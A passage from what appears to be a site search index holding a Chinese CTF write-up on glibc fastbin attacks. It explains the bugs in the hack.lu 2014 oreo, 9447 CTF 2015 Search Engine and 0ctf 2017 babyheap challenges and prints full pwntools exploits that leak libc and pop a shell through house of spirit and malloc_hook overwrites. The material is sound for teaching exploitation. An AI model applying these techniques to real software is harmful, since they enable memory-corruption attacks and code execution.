\u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002 ~~\u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\u3002~~\u5c06\u6700\u540e\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\uff0c\u7136\u540e\u5728\u91ca\u653e\u5f53\u524d\u5806\u6700\u540e 4 \u5b57\u8282\u6307\u5411\u7684\u5185\u5b58\u5730\u5740\uff0c\u5982\u679c\u4e3a 0 \u5219\u7ed3\u675f\u91ca\u653e\u3002 pwndbg> x /20wx 0x0804b858-0x8 0x804b850: 0x00000000 0x00000041 0x64646464 0x64646464 0x804b860: 0x00000000 0x00000000 0x00000000 0x00000000 0x804b870: 0x63636300 0x63636363 0x00000063 0x00000000 0x804b880: 0x00000000 0x00000000 0x00000000 0x0804b818<--\u6307\u5411\u4e0b\u4e00\u4e2a\u5806 0x804b890: 0x00000000 0x00020771 0x00000000 0x00000000 \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002 \u6f0f\u6d1e \u00b6 create \u7684\u65f6\u5019 name \u548c description \u90fd\u5b58\u5728\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4e24\u8005\u53ef\u8f93\u5165\u957f\u5ea6\u90fd\u662f 56 \u5b57\u8282\u3002\u4fee\u6539\u4e24\u8005\u90fd\u662f\u53ef\u4ee5\u4fee\u6539 chunk \u6307\u5411\u7684\u4e0b\u4e00\u4e2a chunk \u5730\u5740\uff0c\u4e5f\u5c31\u662f\u6700\u540e 4 \u5b57\u8282\uff0c\u4fee\u6539 desc \u65f6\u8fd8\u53ef\u4ee5\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u4fe1\u606f\u3002 \u601d\u8def \u00b6 \u6ca1\u6709\u6253\u5f00 PIE \uff0c\u4e00\u5f00\u59cb\u60f3\u7740 double free \u7136\u540e\u6539 got \u8868\u5730\u5740\u6cc4\u9732 getshell \u4e00\u6761\u9f99\u3002\u4f46\u662f\u6709\u4e2a\u5927\u95ee\u9898\uff0cchunk_ptr \u53ea\u4fdd\u5b58\u6700\u540e\u7533\u8bf7 chunk \u7684\u6307\u9488\u4fe1\u606f\uff0c\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684 chunk \uff0c\u65e7\u6307\u9488\u5c31\u4f1a\u88ab\u8986\u76d6\u4e86\uff0c\u6307\u9488\u4e22\u5931\u4e86\uff0c\u65e0\u6cd5\u5b8c\u6210 double free \u3002 \u6700\u7ec8\u4f7f\u7528 house of spirit getshell \u3002 \u7533\u8bf7\u4e00\u4e2a chunk \uff0c\u901a\u8fc7\u6ea2\u51fa\u5c06\u67d0\u4e2a\u51fd\u6570 got \u8868\u5730\u5740\u5199\u5165\u6700\u540e 4 \u4e2a\u5b57\u8282\uff0c\u7528\u8f93\u51fa\u529f\u80fd\u6cc4\u9732 libc \u5730\u5740\u3002 \u7533\u8bf7 0x40 \u4e2a chunk \uff0c\u7528\u4e8e\u540e\u7eed\u4f2a\u9020 fastbin \u7ed5\u8fc7 size check \u68c0\u67e5\u3002 \u6ea2\u51fa\u4fee\u6539 chunk \u6700\u540e 4 \u5b57\u8282\u7684\u4e0b\u4e00\u4e2a chunk \u6307\u9488\uff0c\u6307\u5411 0x0804A2A8 notice_ptr \uff0c\u8fd9\u4e2a\u662f\u4f5c\u4e3a fake chunk \u7684 fd \u4f4d\u3002 \u5e03\u7f6e 0x0804A2A8 \u540e\u9762\u7684 chunk \u4fe1\u606f\u7ed5\u8fc7\u68c0\u67e5\uff0c\u524d\u9762\u7684\u7ed5\u8fc7\u4f2a\u9020\u5df2\u7ecf\u5728\u7b2c\u4e00\u6b65\u5b8c\u6210\u3002 \u63d0\u4ea4\u4fe1\u606f\uff08free all chunk\uff09\uff0cfastbin \u5c31\u4f1a\u5f97\u5230\u8fd9\u6837\u7684\u4e00\u7ec4\u6307\u9488\uff1a 0x40: 0x0804A2A0->some where heap->NULL \u5230\u8fd9\u91cc\u5c31\u5f97\u5230\u4e00\u7ec4\u4efb\u610f\u5199\u6307\u9488\u4e86\u3002 \u7533\u8bf7 0x40 \u4e2a chunk \u4f1a\u8bb0\u5f55\u5728 chunk_num \uff0c\u5982\u679c\u4ee5 0x0804A2A8 \u4e3a fake chunk \u7684 fd \u6307\u9488\uff0c\u90a3\u4e48 chunk_num \u521a\u521a\u597d\u5c31\u662f fake_chunk size \u4f4d\uff1a pwndbg> x /20wx 0x0804A2A0 0x804a2a0: 0x00000000 0x00000040 0x0804a2c0 0x00000000 0x804a2b0: 0x00000000 0x00000000 0x00000000 0x00000000 \u7533\u8bf7\u7b2c 0x40 \u7684\u65f6\u5019\u6ea2\u51fa\u4fee\u6539\u6700\u540e 4 \u5b57\u8282\u7684\u4e0b\u4e00 chunk \u5730\u5740\u4e3a 0x0804A2A8 \u3002bypass fastbin size check \u3002 \u7136\u540e\u5229\u7528\u5199\u5165 notice \u4fe1\u606f\uff0c\u5e03\u7f6e fake_chunk \u540e\u4e00\u4e2a chunk \u4fe1\u606f\uff0cbypass \u76f8\u5173\u4fdd\u62a4\uff0c\u5b8c\u6210 house of spirit \u5e03\u7f6e\u3002 \u5199\u5165\u5185\u5bb9\u5c31\u662f\u5c31\u662f\uff1a\u4ece 0x0804A2A8 + 0x30 \u5f00\u59cb\u5199\u5165\u4e0b\u4e00\u4e2a chunk header \u4fe1\u606f\u5373\u53ef\uff08prev_size = 0x40 , size = 0x100 \uff09\u3002 \u5f53 free all chunk \u65f6 fake chunk \u5c31\u4f1a\u901a\u8fc7\u68c0\u67e5\uff0c\u6210\u529f\u653e\u5165\u5230 bin \u4e2d\uff1a 0x40: 0x0804A2A0->some where heap->NULL \u518d\u6b21\u7533\u8bf7 chunk \uff0c\u5e76\u5199\u5165\u51fd\u6570\u5730\u5740\uff0c\u4e4b\u540e\u901a\u8fc7\u5199\u5165 notice \u4fee\u6539\u51fd\u6570\u3002 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'i386' ) context . binary = \"./oreo\" oreo = ELF ( \"./oreo\" ) p = process ( \"./oreo\" ) libc = ELF ( './libc.so.6' ) def add ( descrip , name ): p . sendline ( '1' ) #p.recvuntil('Rifle name: ') p . sendline ( name ) #p.recvuntil('Rifle description: ') #sleep(0.5) p . sendline ( descrip ) def show_rifle (): p . sendline ( '2' ) p . recvuntil ( '=================================== \\n ' ) def order (): p . sendline ( '3' ) def message ( notice ): p . sendline ( '4' ) #p.recvuntil(\"Enter any notice you'd like to submit with your order: \") p . sendline ( notice ) def exp (): print 'step 1. leak libc base' name = 27 * 'a' + p32 ( oreo . got [ 'puts' ]) add ( 25 * 'a' , name ) show_rifle () p . recvuntil ( '=================================== \\n ' ) p . recvuntil ( 'Description: ' ) puts_addr = u32 ( p . recvuntil ( ' \\n ' , drop = True )[: 4 ]) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) print 'step 2. free fake chunk at 0x0804A2A8' # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle < 0x3f : # set next link=NULL add ( 25 * 'a' , 'a' * 27 + p32 ( 0 )) oifle += 1 payload = 'a' * 27 + p32 ( 0x0804a2a8 ) # set next link=0x0804A2A8, try to free a fake chunk add ( 25 * 'b' , payload ) # gdb.attach(p) # before free, we need to bypass some check # fake chunk's size is 0x40 # 0x20 *'a' for padding the last fake chunk # 0x40 for fake chunk's next chunk's prev_size # 0x100 for fake chunk's next chunk's size # set fake iofle' next to be NULL payload = 0x20 * ' \\x00 ' + p32 ( 0x40 ) + p32 ( 0x100 ) # payload = payload.ljust(60, 'b') # payload += p32(0) # payload = payload.ljust(128, 'c') message ( payload ) # fastbin 0x40: 0x0804A2A0->some where heap->NULL order () p . recvuntil ( 'Okay order submitted! \\n ' ) print 'step 3. get shell' # modify free@got to system addr payload = p32 ( oreo . got [ 'strlen' ]) . ljust ( 20 , 'a' ) add ( payload , 'b' * 20 ) log . success ( 'system addr: ' + hex ( system_addr )) #gdb.attach(p) message ( p32 ( system_addr ) + '||/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () [\u539f\u521b]2014 hack.lu oreo 2015 9447 CTF : Search Engine \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 1 2 3 4 5 6 Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled \u7a0b\u5e8f\u6ca1\u6709 setbuf \uff0c\u4f1a\u81ea\u52a8\u7533\u8bf7 chunk \u5b58\u653e\u8f93\u5165\u7f13\u51b2\u6570\u636e\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u4e00\u4e2a\u53d8\u79cd\u7684\u5806\u7ba1\u7406\u5668\uff0c\u7b97\u662f\u6709\u589e\u5220\u67e5\u529f\u80fd\u3002\u83dc\u5355\u4e24\u4e2a\u5165\u53e3\uff1a Search with a word Index a sentence index \u53ef\u4ee5\u521b\u5efa\u5806\uff0c\u5927\u5c0f\u81ea\u5b9a\u4e49\uff08\u5c0f\u4e8e 0xFFD\uff09\uff0c\u8bfb\u53d6\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u7b49\u4e8e\u7ed9\u5b9a\u7684\u957f\u5ea6\uff0c\u8f93\u5165\u5b57\u7b26\u4e32\u6ca1\u6709\u8bbe\u7f6e\u7ed3\u675f\u7b26 \\x00 \u3002 search \u641c\u7d22\u53e5\u5b50\uff0c\u8bfb\u53d6\u641c\u7d22\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u7b49\u7ed9\u5b9a\u957f\u5ea6\uff0c\u68c0\u7d22\u89c4\u5219\u5982\u4e0b\uff1a for ( i = chunk_list ; i ; i = * ( _QWORD * )( i + 0x20 ) ) { if ( ** ( _BYTE ** )( i + 16 ) ) { if ( * ( _DWORD * )( i + 8 ) == v0 && ! memcmp ( * ( const void ** ) i , chunk_ptr , v0 ) ) { \u5177\u4f53\u7ed3\u6784\u4f53\u7ed3\u6784\u8c03\u8bd5\u4e00\u4e0b\u5c31\u80fd\u770b\u5230\u903b\u8f91\uff0c0x28 \u90a3\u4e2a\u5c31\u662f\u7ed3\u6784\u4f53 chunk \u3002 \u9996\u5148\u662f sentence chunk \u9996\u5b57\u8282\u4e0d\u80fd\u4e3a \\x00 \uff0c\u7136\u540e\u6839\u636e size \u548c memcmp \u641c\u7d22\u76f8\u540c\u7684 chunk \u3002 \u6f0f\u6d1e \u00b6 \u6700\u660e\u663e\u7684\u5c31\u662f double free \uff0c\u5728 search \u627e\u5230\u5bf9\u5e94 sentenc chunk \u4e4b\u540e\uff0c\u9009\u62e9\u91ca\u653e\u5b8c\u6210\u540e\uff0c\u5e76\u6ca1\u6709\u5c06\u7ed3\u6784\u4f53\u6307\u9488\u7f6e\u96f6\u3002 \u8fd9\u4e2a\u529f\u80fd\u51fd\u6570\u8fd8\u6709\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u91ca\u653e sentenc chunk \u4e4b\u524d\u4f1a\u4f7f\u7528 memset \u5c06 chunk \u5168\u90e8\u7f6e\u96f6\uff0c\u907f\u514d\u4e86\u68c0\u67e5\u88ab\u91ca\u653e\u7684 chunk \uff08\u6e90\u7801\u68c0\u67e5\u673a\u5236\uff1a if ( **(_BYTE **)(i + 16) ) \uff09\uff0c\u4f46\u662f\u5f53 chunk \u653e\u5165 fastbin \u975e\u9996\u4e2a chunk \u6216\u8005\u662f unsortedbin \u7b49\u65f6\uff0c\u4f1a\u5411 fd \u3001bk \u5199\u5165\u5730\u5740\u4fe1\u606f\uff0c\u4f7f\u5f97 sentenc chunk \u9996\u5b57\u8282\u975e 0 \uff0c\u81f4\u4f7f search \u65f6\u6700\u7ec8\u8fd8\u662f\u4f1a\u641c\u7d22\u88ab\u91ca\u653e\u7684 chunk \u3002 \u8fd8\u6709\u6f0f\u6d1e\u5c31\u662f\u5199\u5165 sentenc \u7684\u65f6\u5019\uff0c\u5982\u679c\u5199\u5165\u957f\u5ea6\u521a\u521a\u597d\u7b49\u4e8e\u7ed9\u51fa\u7684\u5199\u5165\u957f\u5ea6\uff0c\u90a3\u4e48 sentenc \u7ed3\u5c3e\u4e0d\u4f1a\u8865\u4e0a\u7ed3\u675f\u7b26 \\x00 \u3002\uff08\u7f51\u4e0a\u6709 wp \u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u6cc4\u9732\u6808\u4e0a\u7684 libc \u5730\u5740\uff09 \u601d\u8def \u00b6 \u5229\u7528 free \u4e4b\u540e\u6ca1\u6709\u7f6e\u96f6\u6307\u9488\uff0c\u5b8c\u6210\u6cc4\u9732 libc \u5730\u5740\uff0cfastbin Arbitrary Alloc \u4fee\u6539 malloc_hook \u4e3a onegadget \u3002 \u7533\u8bf7\u4e00\u4e2a\u975e fastbin \u5927\u5c0f chunk \uff0c\u5c06\u5176\u91ca\u653e\uff0cfd \u6307\u9488\u5c31\u4f1a\u5199\u5165 libc \u6bb5\u5730\u5740\u3002\u5229\u7528 search \u641c\u7d22 \\x00 \uff0c\u627e\u5230\u5728 unsorted bin \u4e2d\u7684 chunk \uff0c\u7a0b\u5e8f\u4f1a\u5c06 chunk \u7684 fd \u6307\u9488\u7ed9\u8f93\u51fa\u3002 \u7533\u8bf7 3 \u4e2a fastbin chunk \uff0c\u5229\u7528\u6700\u540e\u4e24\u4e2a\u5b8c\u6210 Arbitrary Alloc \u7be1\u6539 malloc_hook \u7533\u8bf7 0x88 unsorted bin chunk \uff0c\u6cc4\u9732 libc \u5730\u5740\uff1a Index ( ' m ' . rjust ( 0x88 , 'a' )) search ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( 'Found 136: ' ) unsortbin_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"unsortbin_addr:\" + hex ( unsortbin_addr )) Arbitrary Alloc \u6b65\u9aa4\uff1asky \u4e09\u4e2a chunk \u5148\u91ca\u653e\u5230 fastbin \u4e2d\uff0c\u7136\u540e double free k chunk \uff0c\u5b8c\u6210\u4fee\u6539\u94fe\u8868\u3002\u5982\u679c\u7f3a\u5c11 s chunk \u53ea\u4f7f\u7528\u4e24\u4e2a\u5806\uff0cdouble free \u65f6\u62a5\u9519\uff1a double free or corruption (fasttop) \uff0c\u6b64\u65f6\u88ab double free chunk \u7684\u94fe\u9996\u3002 search ( 's' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'k' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'y' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( \"Found\" ) p . sendline ( 'n' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) fakechunk_addr = malloc_hook - 0x23 Index ( p64 ( fakechunk_addr ) . ljust ( 0x68 , 'b' )) Index ( ' s ' . rjust ( 0x68 , 'b' )) Index ( ' k ' . rjust ( 0x68 , 'b' )) Index ( p64 ( 0xf1207 + libc_base ) . rjust ( 0x1b , 'a' ) . ljust ( 0x68 , 'b' )) \u7be1\u6539\u94fe\u8868\u4e4b\u540e\uff0c\u901a\u8fc7\u504f\u79fb\u627e\u5230 size \u5728 fastbin \u8303\u56f4\u7684 fakechunk \u3002 EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./search\" ) elf = ELF ( \"./search\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def search ( word ): p . recvuntil ( '3: Quit \\n ' , timeout = 3 ) p . sendline ( '1' ) p . recvuntil ( 'Enter the word size: \\n ' ) p . sendline ( str ( len ( word ))) p . recvuntil ( 'Enter the word: \\n ' ) p . send ( word ) def Index ( word ): p . recvuntil ( '3: Quit \\n ' , timeout = 3 ) p . sendline ( '2' ) p . recvuntil ( 'Enter the sentence size: \\n ' ) p . sendline ( str ( len ( word ))) p . recvuntil ( 'Enter the sentence: \\n ' ) p . send ( word ) def exp (): Index ( ' m ' . rjust ( 0x88 , 'a' )) search ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( 'Found 136: ' ) unsortbin_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"unsortbin_addr:\" + hex ( unsortbin_addr )) libc_base = unsortbin_addr - 0x3c4b78 system = libc_base + libc . sym [ 'system' ] str_binsh = libc_base + libc . search ( '/bin/sh' ) . next () malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] log . info ( 'libc_base:' + hex ( libc_base )) log . info ( \"system:\" + hex ( system )) log . info ( \"str_binsh:\" + hex ( str_binsh )) log . info ( \"malloc_hook:\" + hex ( malloc_hook )) p . sendline ( 'n' ) Index ( ' s ' . rjust ( 0x68 , 'a' )) Index ( ' k ' . rjust ( 0x68 , 'a' )) Index ( ' y ' . rjust ( 0x68 , 'a' )) search ( 's' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'k' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( 'y' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) search ( ' \\x00 ' ) p . recvuntil ( \"Found\" ) p . sendline ( 'n' ) p . recvuntil ( \"Found\" ) p . sendline ( 'y' ) fakechunk_addr = malloc_hook - 0x23 Index ( p64 ( fakechunk_addr ) . ljust ( 0x68 , 'b' )) Index ( ' s ' . rjust ( 0x68 , 'b' )) Index ( ' k ' . rjust ( 0x68 , 'b' )) ''' 0x45226 execve(\"/bin/sh\", rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\"/bin/sh\", rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf0364 execve(\"/bin/sh\", rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1207 execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' # gdb.attach(p) Index ( p64 ( 0xf1207 + libc_base ) . rjust ( 0x1b , 'a' ) . ljust ( 0x68 , 'b' )) # gdb.attach(p) p . interactive () if __name__ == '__main__' : exp () 2017 0ctf babyheap \u00b6 \u57fa\u672c\u60c5\u51b5 \u00b6 1 2 3 4 5 Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled \u4fdd\u62a4\u5168\u5f00\uff0cRELRO \u5168\u5f00\uff0cgot \u8868\u4e0d\u80fd\u4fee\u6539\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u7ba1\u7406\u5668\uff0c\u6709\u589e\u5220\u67e5\u6539\u529f\u80fd\u3002 \u7ed3\u6784\u4f53\uff1a struct { int inuse ; int size ; void * chunk_ptr ; } \u9650\u5236\u7533\u8bf7 chunk \u4e0a\u9650\u4e3a 16 \u4e2a\uff0c\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8e 4096 \u5b57\u8282\u5373\u53ef\u3002\u56db\u5927\u529f\u80fd\u90fd\u662f\u6839\u636e chunk \u4e0b\u6807\u8fdb\u884c\u64cd\u4f5c\u3002 \u6f0f\u6d1e \u00b6 \u5728\u4fee\u6539\u51fd\u6570\u4e2d\uff0c\u4fee\u6539\u7684\u5927\u5c0f\u662f\u81ea\u884c\u8f93\u5165\u7684\uff0c\u5e76\u4e0d\u662f\u8bfb\u53d6\u7ed3\u6784\u4f53\u4e2d chunk size \uff0c\u9020\u6210\u4e86\u5806\u6ea2\u51fa\u95ee\u9898\u3002 __int64 __fastcall my_write ( __int64 a1 ) { __int64 index ; // rax int i ; // [rsp+18h] [rbp-8h] int size ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); index = get_num (); i = index ; if ( ( signed int ) index >= 0 && ( signed int ) index <= 15 ) // \u68c0\u67e5\u4e0b\u6807\u8303\u56f4 { index = * ( unsigned int * )( 24L L * ( signed int ) index + a1 ); // \u63d0\u53d6chunk\u6307\u9488 if ( ( _DWORD ) index == 1 ) // \u68c0\u67e5inuse\u4f4d { printf ( \"Size: \" ); index = get_num (); size = index ; if ( ( signed int ) index > 0 ) // \u68c0\u67e5size\u5927\u4e8e0 { printf ( \"Content: \" ); index = write_chunk ( * ( _QWORD * )( 24L L * i + a1 + 16 ), size ); // \u5806\u6ea2\u51fa\uff0c\u6ca1\u6709\u5bf9size\u8fdb\u884c\u68c0\u67e5 } } } return index ; } \u601d\u8def \u00b6 \u5229\u7528\u5806\u6ea2\u51fa\uff0c\u9020\u6210\u5806\u91cd\u53e0\uff08\u901a\u8fc7 extend \u5411\u524d\u5408\u5e76\uff09\uff0c\u6cc4\u9732\u51fa libc \u5730\u5740\u3002\u518d\u6b21\u5229\u7528\u5806\u6ea2\u51fa\uff0c\u9020\u6210 fastbin attack\uff08Arbitray Alloc\uff09\uff0c\u4fee\u6539 __malloc_hook \u4e3a onegadget \u3002 \u521b\u5efa\u975e fastbin \u7684 chunk0\u30012 \u89e6\u53d1 unlink \u5408\u5e76\u4e3a\u4e00\u4e2a\u6574\u4f53\uff1b\u88ab\u91cd\u53e0 chunk1 \u7528\u4e8e\u8bfb\u53d6 libc \u5730\u5740\uff1b\u4fdd\u62a4\u907f\u514d\u4e0e topchunk \u5408\u5e76\u7684 chunk3 \u3002 \u91ca\u653e chunk0 \uff0c\u4fee\u6539 chunk1 \u6ea2\u51fa\u8986\u76d6 chunk2 \u7684 prev_size \u548c size_inuse \uff0c\u91ca\u653e chunk2 \u89e6\u53d1 unlink \u5408\u5e76\u3002 create ( 0x80 ) #0 create ( 0x10 ) #1 create ( 0x80 ) #2 create ( 0x10 ) #3 free ( 0 ) payload = 'a' * 0x10 + p64 ( 0xb0 ) + p64 ( 0x90 ) write ( 1 , len ( payload ), payload ) free ( 2 ) create ( 0x80 ) dump ( 1 ) p . recvuntil ( \"Content: \\n \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) \u7533\u8bf7 0x60 fastbin chunk \u4e4b\u540e\u5c31\u662f\u5e38\u89c4\u7684\u4fee\u6539 fastbin fd \u6307\u9488\u8fbe\u5230\u4efb\u610f\u5199\u7684\u64cd\u4f5c\u3002\u8fd9\u91cc\u504f\u79fb\u6784\u9020 size \u4f4d\u6211\u9009\u62e9 0x23 \u3002 create ( 0x10 ) #3 create ( 0x70 ) #4 create ( 0x60 ) #5 free ( 5 ) payload = 'c' * 0xa0 + p64 ( 0 ) + p64 ( 0x71 ) payload += p64 ( malloc_hook - 0x23 ) # write(3,len(payload),payload) write ( 4 , len ( payload ), payload ) create ( 0x60 ) #5 create ( 0x60 ) #6 payload = 'a' * ( 0x23 - 0x10 ) payload += p64 ( onegadget ) write ( 6 , len ( payload ), payload ) creat ( 0x20 ) \u4f2a\u9020 unsortedbin \u4e3a fastbin \u00b6 \u8fd9\u662f\u53e6\u5916\u4e00\u4e2a\u601d\u8def\u6cc4\u9732\u51fa libc \u5730\u5740\uff0c\u524d\u9762\u662f\u7528 unlink \u673a\u5236\u5b9e\u73b0\u7684\u4e00\u4e2a\u5806\u91cd\u53e0\u3002\u8fd9\u91cc\u7528 wiki \u7684\u65b9\u6cd5\uff0c\u901a\u8fc7\u4fee\u6539 fastbin fd \u6307\u9488\uff0c\u914d\u5408\u4fee\u6539 chunk header \u4fe1\u606f\uff0c\u5c06\u4e00\u4e2a inuse \u7684 unsorted bin \u653e\u5165\u5230 fastbin \uff0c\u91cd\u65b0\u7533\u8bf7\u51fa\u6765\uff0c\u5b9e\u73b0\u4e24\u4e2a\u6307\u9488\u6307\u5411\u4e00\u4e2a\u5730\u5740\u3002 \u5e03\u7f6e\u597d\u5806\u60c5\u51b5\uff1a create ( 0x10 ) #\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2achunk header create ( 0x10 ) #fastbin create ( 0x10 ) #fastbin create ( 0x10 ) #\u6ea2\u51fa\u4fee\u6539\u4e0b\u4e00\u4e2achunk header create ( 0x80 ) #\u88ab\u653e\u5165fastbin\u7684chunk create ( 0x100 ) #\u9632\u6b62unsortedbin\u4e0etopchunk\u5408\u5e76 #\u5e03\u7f6efastbin #chunk1->chunk2->0 free ( 2 ) free ( 1 ) \u7136\u540e\u4fee\u6539 fastbin fd \u6307\u9488\u6307\u5411 unsorted bin #fastbin:chunk1->chunk4->0 payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x21 ) payload += ' \\x80 ' write ( 0 , len ( payload ), payload ) \u7136\u540e\u5c06 unsorted bin \u7684 chunk size \u4fee\u6539\u4e3a\u6240\u5728\u7684 fastbin \u5927\u5c0f\uff0c\u4ece\u800c\u7ed5\u8fc7 fastbin \u7533\u8bf7\u65f6\u7684\u68c0\u67e5\uff1a payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x21 ) write ( 3 , len ( payload ), payload ) fastbin \u7533\u8bf7\u68c0\u67e5\u6e90\u7801\uff1a if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } \u7533\u8bf7\u4e24\u6b21 fastbin \uff0c\u5c06 unsorted bin \u7533\u8bf7\u51fa\u6765\u3002\u7136\u540e\u9700\u8981\u5c06 unsorted bin \u7684 chunk_size \u4fee\u6539\u4e3a\u6b63\u786e\u5927\u5c0f\uff0c\u624d\u80fd\u6210\u529f\u91ca\u653e\uff1a create ( 0x10 ) create ( 0x10 ) #\u4fee\u590dchunk_size payload = 'a' * 0x10 payload += p64 ( 0 ) + p64 ( 0x91 ) write ( 3 , len ( payload ), payload ) free ( 4 ) dump ( 2 ) EXP \u00b6 from pwn import * context ( log_level = 'debug' , os = 'linux' , arch = 'amd64' ) p = process ( \"./babyheap\" ) elf = ELF ( \"./babyheap\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size ): p . recvuntil ( \"Command: \" ) p . sendline ( '1' ) p . recvuntil ( \"Size: \" ) p . sendline ( str ( size )) def write ( index , size , content ): p . recvuntil ( \"Command: \" ) p . sendline ( '2' ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) p . recvuntil ( \"Size: \" ) p . sendline ( str ( size )) p . recvuntil ( \"Content: \" ) p . send ( content ) def free ( index ): p . recvuntil ( \"Command: \" ) p . sendline ( '3' ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) def dump ( index ): p . recvuntil ( \"Command: \" ) p . sendline ( \"4\" ) p . recvuntil ( \"Index: \" ) p . sendline ( str ( index )) # ex create ( 0x80 ) #0 create ( 0x10 ) #1 create ( 0x80 ) #2 create ( 0x10 ) #3 free ( 0 ) payload = 'a' * 0x10 + p64 ( 0xb0 ) + p64 ( 0x90 ) write ( 1 , len ( payload ), payload ) free ( 2 ) create ( 0x80 ) dump ( 1 ) p . recvuntil ( \"Content: \\n \" ) leak_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"leak_addr:\" + hex ( leak_addr )) libc_base = leak_addr - 0x3c4b78 malloc_hook = libc_base + libc . sym [ '__malloc_hook' ] one = [ 0x45226 , 0x4527a , 0xf0364 , 0xf1207 ] onegadget = one [ 1 ] + libc_base log . info ( \"libc_base:\" + hex ( libc_base )) log . info ( \"malloc_hook:\" + hex ( malloc_hook )) log . info ( \"onegadget:\" + hex ( onegadget )) create ( 0x10 ) #3 create ( 0x70 ) #4 create ( 0x60 ) #5 free ( 5 ) payload = 'c' * 0xa0 + p64 ( 0 ) + p64 ( 0x71 ) payload += p64 ( malloc_hook - 0x23 ) # write(3,len(payload),payload) write ( 4 , len ( payload ), payload ) create ( 0x60 ) #5 create ( 0x60 ) #6 payload = 'a' * ( 0x23 - 0x10 ) payload += p64 ( onegadget ) write ( 6 , len ( payload ), payload ) create ( 0x20 ) # gdb.attach(p,\"b *$rebase (0x119F)\") p . interactive ()","title":"fastbin attack"},{"location":"Pwn/glibc-heap/fastbin/#fastbin-attack","text":"","title":"Fastbin Attack"},{"location":"Pwn/glibc-heap/fastbin/#_1","text":"fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a 